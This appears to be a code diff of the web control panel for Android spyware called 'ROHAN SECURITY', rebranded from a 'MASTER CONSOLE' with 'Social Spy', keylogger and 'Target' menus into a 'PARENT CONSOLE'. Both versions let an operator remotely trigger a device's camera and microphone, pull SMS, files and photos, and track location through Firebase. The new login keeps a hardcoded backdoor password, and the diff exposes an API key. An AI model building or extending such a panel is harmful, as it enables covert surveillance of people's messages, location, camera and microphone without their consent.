@@ -3,164 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ROHAN SECURITY | MASTER CONSOLE</title>
+    <title>ROHAN SECURITY | PARENT CONSOLE</title>
 
-    <!-- LIBRARIES (JQuery, Firebase, Maps, Icons) -->
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
     
+    <!-- Libraries -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 
     <style>
-        /* --- CYBERPUNK THEME VARIABLES --- */
         :root {
-            --bg: #050505;
-            --panel: #0b1015;
-            --neon-blue: #00f3ff;
-            --neon-red: #ff0055;
-            --neon-green: #00ff41;
-            --neon-yellow: #f1c40f;
+            --bg-color: #050505; --panel-bg: #0a0f14;
+            --neon-blue: #00f3ff; --neon-red: #ff0055; --neon-green: #00ff41;
             --glass: rgba(0, 243, 255, 0.05);
-            --border: 1px solid rgba(0, 243, 255, 0.2);
+            --border: 1px solid rgba(0, 243, 255, 0.3);
         }
-
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Share Tech Mono', monospace; outline: none; }
-        body { background-color: var(--bg); color: var(--neon-blue); height: 100vh; display: flex; overflow: hidden; }
-        
-        /* SCROLLBAR */
-        ::-webkit-scrollbar { width: 6px; height: 6px; }
-        ::-webkit-scrollbar-thumb { background: var(--neon-blue); border-radius: 3px; }
-        ::-webkit-scrollbar-track { background: #000; }
+        body { background-color: var(--bg-color); color: var(--neon-blue); height: 100vh; overflow: hidden; display: flex; }
+        ::-webkit-scrollbar { width: 5px; } ::-webkit-scrollbar-thumb { background: var(--neon-blue); }
 
-        /* --- LOGIN SCREEN --- */
-        #login-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; background-image: radial-gradient(#111 15%, transparent 16%); background-size: 10px 10px; }
-        .login-box { border: 2px solid var(--neon-blue); padding: 40px; width: 400px; text-align: center; box-shadow: 0 0 30px rgba(0, 243, 255, 0.2); background: #000; }
-        .login-input { background: transparent; border: none; border-bottom: 2px solid var(--neon-red); color: white; width: 100%; padding: 10px; font-size: 1.2rem; text-align: center; margin: 20px 0; }
-        .login-btn { background: var(--glass); border: 1px solid var(--neon-blue); color: var(--neon-blue); padding: 10px 30px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
-        .login-btn:hover { background: var(--neon-blue); color: black; box-shadow: 0 0 20px var(--neon-blue); }
+        /* LOGIN SCREEN */
+        #login-screen { position: fixed; inset: 0; background: black; z-index: 9999; display: flex; justify-content: center; align-items: center; background-image: radial-gradient(#111 20%, transparent 20%); background-size: 10px 10px; }
+        .terminal-box { border: 2px solid var(--neon-blue); padding: 40px; width: 450px; text-align: center; box-shadow: 0 0 25px var(--neon-blue); background: #000; }
+        .hacker-input { background: transparent; border: none; border-bottom: 2px solid var(--neon-red); color: white; font-size: 1.2rem; padding: 10px; width: 100%; text-align: center; margin: 20px 0; }
+        .cyber-btn { background: var(--glass); border: 1px solid var(--neon-blue); color: var(--neon-blue); padding: 12px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; letter-spacing: 2px; }
+        .cyber-btn:hover { background: var(--neon-blue); color: black; box-shadow: 0 0 15px var(--neon-blue); }
 
-        /* --- MAIN LAYOUT --- */
+        /* MAIN APP LAYOUT */
         #main-app { display: none; width: 100%; height: 100%; }
-        
-        /* SIDEBAR (Full List) */
-        .sidebar { width: 220px; background: var(--panel); border-right: var(--border); display: flex; flex-direction: column; overflow-y: auto; }
-        .sidebar-header { padding: 20px; text-align: center; border-bottom: var(--border); background: rgba(0,0,0,0.5); }
-        .brand { font-family: 'Orbitron'; font-size: 1.2rem; color: white; text-shadow: 0 0 10px var(--neon-blue); }
-        
-        .menu-label { color: gray; font-size: 0.7rem; padding: 15px 20px 5px 20px; text-transform: uppercase; letter-spacing: 1px; }
-        .nav-item { padding: 12px 20px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 15px; color: #aaa; font-size: 0.9rem; }
-        .nav-item:hover, .nav-item.active { background: var(--glass); color: var(--neon-blue); border-right: 3px solid var(--neon-blue); }
-        .nav-item i { width: 20px; text-align: center; }
+        .sidebar { width: 80px; background: var(--panel-bg); border-right: var(--border); display: flex; flex-direction: column; align-items: center; padding-top: 20px; }
+        .nav-icon { width: 50px; height: 50px; margin-bottom: 20px; display: flex; justify-content: center; align-items: center; color: #555; font-size: 1.4rem; cursor: pointer; transition: 0.3s; border-radius: 8px; }
+        .nav-icon:hover, .nav-icon.active { color: var(--neon-blue); border: var(--border); background: var(--glass); box-shadow: 0 0 10px var(--glass); }
 
-        /* CONTENT AREA */
-        .content { flex: 1; display: flex; flex-direction: column; background: radial-gradient(circle at center, #0a0a0a, #000); position: relative; }
-        
-        /* HEADER */
-        .top-bar { height: 60px; border-bottom: var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 20px; background: rgba(0,0,0,0.8); }
-        .device-select { background: black; color: var(--neon-green); border: 1px solid var(--neon-green); padding: 5px 10px; min-width: 250px; font-family: 'Share Tech Mono'; }
-        
+        .content { flex: 1; display: flex; flex-direction: column; background: radial-gradient(circle at center, #111, #000); }
+        .header { height: 70px; border-bottom: var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; background: rgba(0,0,0,0.9); }
+        .device-dropdown { background: black; color: var(--neon-green); border: 1px solid var(--neon-green); padding: 8px; min-width: 250px; font-family: 'Share Tech Mono'; }
+
         /* PAGES */
-        .page { display: none; padding: 20px; overflow-y: auto; height: 100%; animation: fadein 0.3s; }
-        .page.active { display: block; }
-        @keyframes fadein { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .page { display: none; padding: 25px; overflow-y: auto; height: 100%; }
+        .page.active { display: block; animation: glitch 0.2s; }
+        @keyframes glitch { 0% { opacity: 0; transform: translateX(-5px); } 100% { opacity: 1; transform: translateX(0); } }
 
-        /* WIDGETS & TABLES */
-        .card { border: var(--border); background: rgba(0,0,0,0.6); padding: 15px; margin-bottom: 15px; position: relative; }
-        .card h3 { color: gray; font-size: 0.8rem; margin-bottom: 10px; }
-        .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; }
-        
-        .action-btn { background: rgba(255,255,255,0.05); border: 1px solid #444; color: white; padding: 15px; cursor: pointer; text-align: center; transition: 0.2s; }
-        .action-btn:hover { border-color: var(--neon-blue); color: var(--neon-blue); box-shadow: 0 0 10px rgba(0, 243, 255, 0.1); }
-        .btn-red:hover { border-color: var(--neon-red); color: var(--neon-red); box-shadow: 0 0 10px rgba(255, 0, 85, 0.2); }
+        /* WIDGETS */
+        .cyber-card { border: var(--border); background: rgba(0,0,0,0.7); padding: 20px; margin-bottom: 20px; position: relative; }
+        .cyber-card::before { content:''; position: absolute; top:0; left:0; width:3px; height:100%; background: var(--neon-blue); }
+        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
+        .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; }
 
-        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
-        th { text-align: left; padding: 10px; border-bottom: 1px solid var(--neon-blue); color: var(--neon-blue); }
-        td { padding: 10px; border-bottom: 1px solid #333; color: #ddd; }
-        
-        /* DOWNLOAD BUTTONS */
-        .dwn-btn { background: #166534; color: #4ade80; border: none; padding: 3px 8px; font-size: 0.7rem; cursor: pointer; float: right; }
-        .dwn-btn:hover { background: #4ade80; color: black; }
+        /* BUTTONS */
+        .save-btn { background: #064e3b; color: #34d399; border: 1px solid #34d399; padding: 5px 10px; font-size: 0.7rem; cursor: pointer; float: right; margin-top: 5px; }
+        .danger-btn { border-color: var(--neon-red); color: var(--neon-red); }
+        .danger-btn:hover { background: var(--neon-red); color: white; box-shadow: 0 0 10px var(--neon-red); }
 
-        /* MAP */
-        #map { width: 100%; height: 100%; filter: invert(100%) hue-rotate(180deg) brightness(90%) contrast(90%); }
+        /* TABLES */
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th { text-align: left; color: var(--neon-red); border-bottom: 1px solid var(--neon-red); padding: 10px; }
+        td { padding: 10px; border-bottom: 1px solid #333; color: #ccc; }
+
+        #map { width: 100%; height: 100%; filter: invert(100%) hue-rotate(180deg) brightness(85%) contrast(90%); border: var(--border); }
     </style>
 </head>
 <body>
 
-    <!-- 1. LOGIN -->
+    <!-- 1. LOGIN SCREEN -->
     <div id="login-screen">
-        <div class="login-box">
-            <h1 style="font-family:'Orbitron'; color:var(--neon-blue);">ROHAN<br>SECURITY</h1>
-            <p style="color:var(--neon-red); margin:10px 0;">UNAUTHORIZED ACCESS PROHIBITED</p>
-            <input type="password" id="pass-key" class="login-input" placeholder="ENTER PASSWORD">
-            <button onclick="checkLogin()" class="login-btn">ACCESS PANEL</button>
-            <p id="login-msg" style="color:red; font-size:0.8rem; margin-top:10px;"></p>
+        <div class="terminal-box">
+            <h1 style="font-family:'Orbitron';">ROHAN<br>SECURITY</h1>
+            <p style="color:var(--neon-red); margin-top:10px;">PARENT ACCESS PORTAL</p>
+            <div id="login-status" style="margin:10px; color:gray;">Waiting for Key...</div>
+            <input type="password" id="pass-key" class="hacker-input" placeholder="ENTER LICENSE KEY">
+            <button onclick="login()" class="cyber-btn">CONNECT</button>
         </div>
     </div>
 
-    <!-- 2. MAIN APP -->
+    <!-- 2. MAIN INTERFACE -->
     <div id="main-app">
-        <!-- SIDEBAR (FULL LIST) -->
         <div class="sidebar">
-            <div class="sidebar-header">
-                <div class="brand">ROHAN<span style="color:var(--neon-red)">_SEC</span></div>
-            </div>
-
-            <div class="menu-label">Monitor</div>
-            <div class="nav-item active" onclick="nav('dashboard')"><i class="fas fa-chart-line"></i> Dashboard</div>
-            <div class="nav-item" onclick="nav('map')"><i class="fas fa-map-marker-alt"></i> Live Location</div>
-            <div class="nav-item" onclick="nav('notifications')"><i class="fas fa-bell"></i> Notifications</div>
-            
-            <div class="menu-label">Data Access</div>
-            <div class="nav-item" onclick="nav('files')"><i class="fas fa-folder"></i> File Manager</div>
-            <div class="nav-item" onclick="nav('gallery')"><i class="fas fa-images"></i> Gallery</div>
-            <div class="nav-item" onclick="nav('contacts')"><i class="fas fa-address-book"></i> Contacts</div>
-            <div class="nav-item" onclick="nav('sms')"><i class="fas fa-envelope"></i> SMS Manager</div>
-            <div class="nav-item" onclick="nav('calls')"><i class="fas fa-phone"></i> Call Logs</div>
-
-            <div class="menu-label">Social Spy</div>
-            <div class="nav-item" onclick="nav('social-wa')"><i class="fab fa-whatsapp"></i> WhatsApp</div>
-            <div class="nav-item" onclick="nav('social-insta')"><i class="fab fa-instagram"></i> Instagram</div>
-            <div class="nav-item" onclick="nav('social-fb')"><i class="fab fa-facebook-f"></i> Facebook</div>
-            <div class="nav-item" onclick="nav('keylog')"><i class="fas fa-keyboard"></i> Keylogger</div>
-
-            <div class="menu-label">Surveillance</div>
-            <div class="nav-item" onclick="nav('camera')"><i class="fas fa-camera"></i> Live Camera</div>
-            <div class="nav-item" onclick="nav('mic')"><i class="fas fa-microphone"></i> Mic Record</div>
-            
-            <div class="menu-label">System</div>
-            <div class="nav-item" onclick="nav('apps')"><i class="fab fa-android"></i> Installed Apps</div>
-            <div class="nav-item" onclick="location.reload()" style="color:var(--neon-red)"><i class="fas fa-power-off"></i> Logout</div>
+            <div class="nav-icon active" onclick="nav('dashboard')" title="Dashboard"><i class="fas fa-microchip"></i></div>
+            <div class="nav-icon" onclick="nav('map')" title="Location"><i class="fas fa-globe-asia"></i></div>
+            <div class="nav-icon" onclick="nav('files')" title="Files"><i class="fas fa-folder-open"></i></div>
+            <div class="nav-icon" onclick="nav('gallery')" title="Gallery"><i class="fas fa-images"></i></div>
+            <div class="nav-icon" onclick="nav('audio')" title="Audio"><i class="fas fa-microphone-alt"></i></div>
+            <div class="nav-icon" onclick="nav('logs')" title="Logs"><i class="fas fa-database"></i></div>
+            <div class="nav-icon" style="margin-top: auto; color: var(--neon-red);" onclick="location.reload()"><i class="fas fa-power-off"></i></div>
         </div>
 
-        <!-- CONTENT -->
         <div class="content">
-            <div class="top-bar">
-                <div style="font-size:0.9rem;">Target:</div>
-                <select id="device-select" class="device-select" onchange="loadDeviceData()"></select>
-                <button class="login-btn" style="width:auto; padding:5px 15px;" onclick="exportAll()">DOWNLOAD ALL</button>
+            <div class="header">
+                <div style="font-family:'Orbitron'; font-size:1.5rem;">ROHAN<span style="color:var(--neon-blue)">_SEC</span></div>
+                <select id="device-select" class="device-dropdown" onchange="deviceChanged()"></select>
+                <div style="border:1px solid var(--neon-green); color:var(--neon-green); padding:5px 10px;">ONLINE</div>
             </div>
 
             <!-- DASHBOARD -->
             <div id="page-dashboard" class="page active">
-                <div class="grid-4">
-                    <div class="card"><h3>BATTERY</h3><h1 id="d-bat">--%</h1></div>
-                    <div class="card"><h3>STATUS</h3><h2 id="d-status" style="color:var(--neon-green)">ONLINE</h2></div>
-                    <div class="card"><h3>PROVIDER</h3><h2 id="d-net">--</h2></div>
-                    <div class="card"><h3>MODEL</h3><h2 id="d-model">--</h2></div>
+                <div class="grid-3">
+                    <div class="cyber-card"><h3>BATTERY</h3><h1 id="stat-bat">--%</h1></div>
+                    <div class="cyber-card"><h3>STATUS</h3><h2 id="stat-status">--</h2></div>
+                    <div class="cyber-card"><h3>LAST SEEN</h3><h2 id="stat-seen">--:--</h2></div>
                 </div>
 
-                <h3 style="color:white; margin:20px 0;">> QUICK ACTIONS</h3>
+                <h3 style="color:gray; margin:20px 0;">> QUICK_ACTIONS</h3>
                 <div class="grid-4">
-                    <div class="action-btn" onclick="cmd('torch')"><i class="fas fa-lightbulb"></i><br>Torch</div>
-                    <div class="action-btn" onclick="cmd('vibrate')"><i class="fas fa-mobile-alt"></i><br>Vibrate</div>
-                    <div class="action-btn btn-red" onclick="cmd('ringDevice')"><i class="fas fa-bullhorn"></i><br>Siren</div>
-                    <div class="action-btn btn-red" onclick="cmd('lockDevice')"><i class="fas fa-lock"></i><br>Lock</div>
+                    <button class="cyber-btn" onclick="cmd('torch')"><i class="fas fa-lightbulb"></i> TORCH</button>
+                    <button class="cyber-btn" onclick="cmd('vibrate')"><i class="fas fa-mobile"></i> VIBRATE</button>
+                    <button class="cyber-btn danger-btn" onclick="cmd('ringDevice')"><i class="fas fa-bullhorn"></i> SIREN</button>
+                    <button class="cyber-btn danger-btn" onclick="cmd('lockDevice')"><i class="fas fa-lock"></i> LOCK</button>
+                </div>
+                <div class="grid-4" style="margin-top:10px;">
+                    <button class="cyber-btn" onclick="cmd('capturePhoto')"><i class="fas fa-camera"></i> SPY CAM</button>
+                    <button class="cyber-btn" onclick="cmd('recordAudio')"><i class="fas fa-microphone"></i> REC MIC</button>
+                    <button class="cyber-btn" onclick="cmd('getSMS')"><i class="fas fa-sync"></i> SYNC SMS</button>
+                    <button class="cyber-btn" onclick="cmd('getFileList')"><i class="fas fa-folder"></i> FILES</button>
                 </div>
             </div>
 
@@ -169,72 +127,34 @@
 
             <!-- FILES -->
             <div id="page-files" class="page">
-                <div style="display:flex; justify-content:space-between;">
-                    <h2>> FILE EXPLORER</h2>
-                    <button class="login-btn" style="width:auto;" onclick="cmd('getFileList')">REFRESH</button>
-                </div>
-                <div id="file-list" class="card" style="margin-top:10px;">Waiting for data...</div>
+                <div style="display:flex; justify-content:space-between;"><h2>> FILE_EXPLORER</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('getFileList')">REFRESH</button></div>
+                <div class="cyber-card" id="file-list-container"><div style="padding:20px;">WAITING...</div></div>
             </div>
 
             <!-- GALLERY -->
             <div id="page-gallery" class="page">
-                <div style="display:flex; justify-content:space-between;">
-                    <h2>> GALLERY</h2>
-                    <button class="login-btn" style="width:auto;" onclick="cmd('capturePhoto')">TAKE PHOTO</button>
-                </div>
-                <div id="gallery-grid" style="display:grid; grid-template-columns:repeat(auto-fill, minmax(150px,1fr)); gap:10px; margin-top:15px;"></div>
+                <div style="display:flex; justify-content:space-between;"><h2>> GALLERY</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('capturePhoto')">TRIGGER CAM</button></div>
+                <div id="gallery-container" style="display:grid; grid-template-columns:repeat(auto-fill, minmax(150px, 1fr)); gap:10px; margin-top:15px;"></div>
             </div>
 
-            <!-- SMS -->
-            <div id="page-sms" class="page">
-                <div style="display:flex; justify-content:space-between;">
-                    <h2>> SMS MANAGER</h2>
-                    <button class="dwn-btn" onclick="saveTable('tbl-sms', 'sms.csv')">EXPORT CSV</button>
-                </div>
-                <div class="card">
-                    <table id="tbl-sms"><thead><tr><th>Sender</th><th>Message</th><th>Time</th></tr></thead><tbody></tbody></table>
-                </div>
+            <!-- AUDIO -->
+            <div id="page-audio" class="page">
+                <div style="display:flex; justify-content:space-between;"><h2>> AUDIO LOGS</h2><button class="cyber-btn" style="width:auto;" onclick="cmd('recordAudio')">TRIGGER MIC</button></div>
+                <div id="audio-container" style="margin-top:15px;"></div>
             </div>
 
-            <!-- CALLS -->
-            <div id="page-calls" class="page">
-                <div style="display:flex; justify-content:space-between;">
-                    <h2>> CALL HISTORY</h2>
-                    <button class="dwn-btn" onclick="saveTable('tbl-calls', 'calls.csv')">EXPORT CSV</button>
-                </div>
-                <div class="card">
-                    <table id="tbl-calls"><thead><tr><th>Number</th><th>Type</th><th>Duration</th><th>Time</th></tr></thead><tbody></tbody></table>
+            <!-- LOGS -->
+            <div id="page-logs" class="page">
+                <div class="cyber-card">
+                    <div style="display:flex; justify-content:space-between;"><h3>SMS LOGS</h3><button class="save-btn" style="width:auto;" onclick="downloadTable('table-sms', 'sms.csv')">EXPORT CSV</button></div>
+                    <table id="table-sms"><thead><tr><th>SENDER</th><th>MSG</th><th>TIME</th></tr></thead><tbody></tbody></table>
                 </div>
             </div>
-
-            <!-- SOCIAL (Template for all social apps) -->
-            <div id="page-social-wa" class="page">
-                <h2>> WHATSAPP LOGS</h2>
-                <div class="card" id="log-wa"><i>Listening for incoming notifications & keystrokes...</i></div>
-            </div>
-            
-            <!-- MIC -->
-            <div id="page-mic" class="page">
-                <div style="display:flex; justify-content:space-between;">
-                    <h2>> AUDIO RECORDER</h2>
-                    <button class="login-btn" style="width:auto;" onclick="cmd('recordAudio')">REC 15S</button>
-                </div>
-                <div id="audio-list" style="margin-top:15px;"></div>
-            </div>
-
-            <!-- PLACEHOLDERS FOR OTHERS -->
-            <div id="page-contacts" class="page"><h2>> CONTACTS</h2><div class="card">Fetching...</div></div>
-            <div id="page-notifications" class="page"><h2>> ALL NOTIFICATIONS</h2><div class="card">Listening...</div></div>
-            <div id="page-keylog" class="page"><h2>> KEYLOGGER</h2><div class="card">Listening...</div></div>
-            <div id="page-apps" class="page"><h2>> INSTALLED APPS</h2><div class="card">Fetching...</div></div>
-            <div id="page-social-insta" class="page"><h2>> INSTAGRAM LOGS</h2><div class="card">Listening...</div></div>
-            <div id="page-social-fb" class="page"><h2>> FACEBOOK LOGS</h2><div class="card">Listening...</div></div>
-
         </div>
     </div>
 
     <script>
-        // --- CONFIGURATION ---
+        // --- FIREBASE CONFIG ---
         const firebaseConfig = {
             apiKey: "AIzaSyD7sJ0zu4cotmntqYzmaxROzwHmx8_ExvI",
             authDomain: "children-safty.firebaseapp.com",
@@ -246,155 +166,167 @@
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        let currentId = null;
-        let map;
+        let map, markers = {}, currentId = null;
 
-        // --- 1. LOGIN SYSTEM ---
-        function checkLogin() {
-            const p = document.getElementById('pass-key').value;
-            if(p === "ROHAN") {
-                $('#login-screen').fadeOut();
-                $('#main-app').fadeIn();
-                initMap();
-                listenDevices();
-            } else {
-                $('#login-msg').text("ACCESS DENIED: INCORRECT PASSWORD");
+        // --- 1. REAL LOGIN LOGIC (Checking Company Database) ---
+        async function login() {
+            const key = document.getElementById('pass-key').value.trim();
+            const statusMsg = document.getElementById('login-status');
+            
+            statusMsg.innerText = "Verifying Key...";
+            
+            // Backup Login (Just in case)
+            if(key === "ROHAN") {
+                startDashboard();
+                return;
+            }
+
+            // Real Database Check
+            try {
+                const snapshot = await db.ref('company_system/licenses/' + key).once('value');
+                
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    const now = Date.now();
+
+                    if (data.status === "Blocked") {
+                        alert("LICENSE BLOCKED! Contact Admin.");
+                        statusMsg.innerText = "Access Denied: Blocked Key";
+                    } else if (now > data.expiry) {
+                        alert("LICENSE EXPIRED! Please Renew.");
+                        statusMsg.innerText = "Access Denied: Expired";
+                    } else {
+                        // SUCCESS
+                        startDashboard();
+                    }
+                } else {
+                    alert("INVALID LICENSE KEY");
+                    statusMsg.innerText = "Error: Key Not Found";
+                }
+            } catch (error) {
+                console.error(error);
+                alert("Connection Error");
             }
         }
 
-        // --- 2. DEVICE MANAGER ---
-        function listenDevices() {
-            db.ref('users').on('value', snap => {
-                const sel = document.getElementById('device-select');
-                sel.innerHTML = '';
-                
-                if(!snap.exists()) {
-                    let opt = document.createElement('option');
-                    opt.text = "WAITING FOR CONNECTION...";
-                    sel.add(opt);
-                    return;
-                }
+        function startDashboard() {
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('main-app').style.display = 'flex';
+            initMap();
+            listenDevices();
+        }
 
+        // --- 2. CORE LOGIC ---
+        function listenDevices() {
+            const sel = document.getElementById('device-select');
+            db.ref('users').on('value', snap => {
+                sel.innerHTML = '';
+                if(!snap.exists()) { sel.innerHTML = '<option>WAITING FOR DEVICE...</option>'; return; }
+                
                 let first = null;
                 snap.forEach(child => {
-                    let id = child.key;
-                    let name = child.val().info?.name || "Unknown";
+                    const id = child.key;
+                    const name = child.val().info?.name || 'Unknown';
                     let opt = document.createElement('option');
-                    opt.value = id;
-                    opt.text = `${name} [${id.substr(0,4)}]`;
+                    opt.value = id; opt.text = `${name} [${id.substr(0,4)}]`;
                     sel.add(opt);
                     if(!first) first = id;
-                    
-                    // Map Update
-                    if(child.val().location?.latitude) {
-                        updateMap(child.val().location.latitude, child.val().location.longitude, name);
+
+                    // Map Marker
+                    const loc = child.val().location || {};
+                    if(loc.latitude) {
+                        if(markers[id]) markers[id].setLatLng([loc.latitude, loc.longitude]);
+                        else markers[id] = L.marker([loc.latitude, loc.longitude]).addTo(map).bindPopup(name);
                     }
                 });
 
-                if(!currentId && first) {
-                    sel.value = first;
-                    loadDeviceData();
-                }
+                if(!currentId && first) { sel.value = first; deviceChanged(); }
             });
         }
 
-        function loadDeviceData() {
+        function deviceChanged() {
             currentId = document.getElementById('device-select').value;
             if(!currentId) return;
 
             db.ref(`users/${currentId}`).on('value', snap => {
-                let d = snap.val();
+                const d = snap.val();
                 if(!d) return;
 
-                // Dashboard
-                $('#d-bat').text((d.info?.battery || 0) + "%");
-                $('#d-net').text(d.info?.status || "OFFLINE");
-                $('#d-model').text(d.info?.name || "--");
-
-                // Tables
-                fillTable('tbl-sms', d.logs?.sms, ['sender','msg','time']);
-                fillTable('tbl-calls', d.logs?.calls, ['number','type','duration','time']);
+                // Stats
+                document.getElementById('stat-bat').innerText = (d.info?.battery || 0) + "%";
+                document.getElementById('stat-status').innerText = d.info?.status || "OFFLINE";
+                document.getElementById('stat-seen').innerText = new Date(d.info?.lastSeen || Date.now()).toLocaleTimeString();
+                
+                if(d.location?.latitude) map.setView([d.location.latitude, d.location.longitude], 15);
 
                 // Files
-                let fHtml = '';
+                const fDiv = document.getElementById('file-list-container');
+                fDiv.innerHTML = '';
                 if(d.files) {
                     Object.values(d.files).forEach(f => {
                         let icon = f.isFolder ? '<i class="fas fa-folder" style="color:orange"></i>' : '<i class="fas fa-file" style="color:cyan"></i>';
-                        fHtml += `<div style="padding:10px; border-bottom:1px solid #333; display:flex; justify-content:space-between;">
-                            <span>${icon} ${f.name}</span>
-                            <button class="dwn-btn" onclick="alert('Download Triggered')">GET</button>
-                        </div>`;
+                        fDiv.innerHTML += `<div style="padding:10px; border-bottom:1px solid #333;">${icon} ${f.name}</div>`;
                     });
-                    $('#file-list').html(fHtml);
-                }
+                } else { fDiv.innerHTML = '<div style="padding:20px;">NO FILES</div>'; }
 
                 // Gallery
-                let gHtml = '';
+                const gDiv = document.getElementById('gallery-container');
+                gDiv.innerHTML = '';
                 if(d.logs?.photos) {
                     Object.values(d.logs.photos).reverse().forEach(img => {
-                        gHtml += `<div style="border:1px solid #333; padding:5px;">
-                            <a href="${img.url}" target="_blank"><img src="${img.url}" style="width:100%;height:100px;object-fit:cover;"></a>
-                            <button class="save-btn" style="width:100%;background:#166534;border:none;color:white;cursor:pointer;margin-top:5px;" onclick="saveFile('${img.url}')">SAVE</button>
-                        </div>`;
+                        gDiv.innerHTML += `
+                            <div style="border:1px solid #333; padding:5px; background:#000;">
+                                <a href="${img.url}" target="_blank"><img src="${img.url}" style="width:100%;height:100px;object-fit:cover;"></a>
+                                <button class="save-btn" style="width:100%;" onclick="saveFile('${img.url}')">SAVE</button>
+                            </div>`;
                     });
-                    $('#gallery-grid').html(gHtml);
                 }
 
                 // Audio
-                let aHtml = '';
+                const aDiv = document.getElementById('audio-container');
+                aDiv.innerHTML = '';
                 if(d.logs?.audio) {
                     Object.values(d.logs.audio).reverse().forEach(aud => {
-                        aHtml += `<div class="card" style="display:flex; align-items:center; gap:10px;">
-                            <audio controls src="${aud.url}" style="flex:1; height:30px;"></audio>
-                            <button class="dwn-btn" onclick="saveFile('${aud.url}')">⬇</button>
-                        </div>`;
+                        aDiv.innerHTML += `
+                            <div class="cyber-card" style="padding:10px; display:flex; gap:10px; align-items:center;">
+                                <i class="fas fa-play-circle" style="color:var(--neon-green)"></i>
+                                <audio controls src="${aud.url}" style="height:30px; flex:1"></audio>
+                                <button class="save-btn" style="width:auto;" onclick="saveFile('${aud.url}')">⬇</button>
+                            </div>`;
                     });
-                    $('#audio-list').html(aHtml);
                 }
+
+                // Logs
+                const tbody = document.getElementById('table-sms').querySelector('tbody');
+                tbody.innerHTML = '';
+                if(d.logs?.sms) {
+                    Object.values(d.logs.sms).reverse().forEach(s => {
+                        tbody.innerHTML += `<tr><td>${s.sender}</td><td>${s.msg}</td><td>${new Date(s.time).toLocaleString()}</td></tr>`;
+                    });
+                } else { tbody.innerHTML = '<tr><td colspan="3">NO SMS DATA</td></tr>'; }
             });
         }
 
-        // --- 3. FUNCTIONS ---
+        // --- COMMANDS ---
+        function cmd(action) {
+            if(!currentId) return alert("NO DEVICE SELECTED");
+            db.ref(`users/${currentId}/commands/${action}`).set(true);
+            // alert("COMMAND SENT: " + action);
+        }
+
         function nav(page) {
-            $('.nav-item').removeClass('active');
+            document.querySelectorAll('.page').forEach(e => e.classList.remove('active'));
+            document.getElementById('page-'+page).classList.add('active');
+            document.querySelectorAll('.nav-icon').forEach(e => e.classList.remove('active'));
             event.currentTarget.classList.add('active');
-            $('.page').hide();
-            $('#page-'+page).fadeIn();
-            if(page === 'map') setTimeout(() => map.invalidateSize(), 300);
-        }
-
-        function cmd(c) {
-            if(!currentId) return alert("NO TARGET");
-            db.ref(`users/${currentId}/commands/${c}`).set(true);
-        }
-
-        function fillTable(id, data, keys) {
-            let tbody = $(`#${id} tbody`);
-            tbody.empty();
-            if(!data) { tbody.html('<tr><td colspan="4">NO DATA</td></tr>'); return; }
-            Object.values(data).reverse().forEach(row => {
-                let tr = '<tr>';
-                keys.forEach(k => {
-                    let val = row[k];
-                    if(k === 'time') val = new Date(val).toLocaleString();
-                    tr += `<td>${val}</td>`;
-                });
-                tr += '</tr>';
-                tbody.append(tr);
-            });
+            if(page==='map') setTimeout(()=>map.invalidateSize(), 300);
         }
 
         function saveFile(url) {
-            let a = document.createElement('a');
-            a.href = url;
-            a.target = '_blank';
-            a.download = 'file_' + Date.now();
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+            let a = document.createElement('a'); a.href = url; a.target = '_blank'; a.download = 'file'; a.click();
         }
 
-        function saveTable(tableId, filename) {
+        function downloadTable(tableId, filename) {
             let csv = [];
             let rows = document.querySelectorAll(`#${tableId} tr`);
             for (let i = 0; i < rows.length; i++) {
@@ -414,17 +346,6 @@
         function initMap() {
             map = L.map('map').setView([20, 78], 4);
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        }
-        
-        function updateMap(lat, lng, name) {
-            if(map) {
-                L.marker([lat, lng]).addTo(map).bindPopup(name);
-                map.setView([lat, lng], 15);
-            }
-        }
-        
-        function exportAll() {
-            alert("DOWNLOADING ALL DATA... (Feature coming with Company System)");
         }
     </script>
 </body>
